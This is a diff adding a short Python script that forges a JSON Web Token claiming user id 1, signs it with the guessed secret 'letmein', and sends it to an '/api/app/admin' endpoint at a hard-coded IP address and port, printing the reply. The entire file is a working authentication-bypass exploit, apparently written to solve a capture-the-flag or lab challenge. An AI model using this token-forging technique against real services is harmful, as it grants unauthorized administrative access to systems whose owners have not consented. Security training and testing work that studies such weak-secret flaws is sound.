@@ -1,0 +1,14 @@
+import requests
+import jwt
+
+url = "http://34.185.207.29:32244/api/app/admin"
+
+payload = {"id":1, "iat":1778587663, "exp":1778674063}
+
+token = jwt.encode(payload, "letmein", algorithm="HS256")
+
+print(token)
+
+r = requests.get(url, headers={"x-access-token": token})
+
+print(r.text)
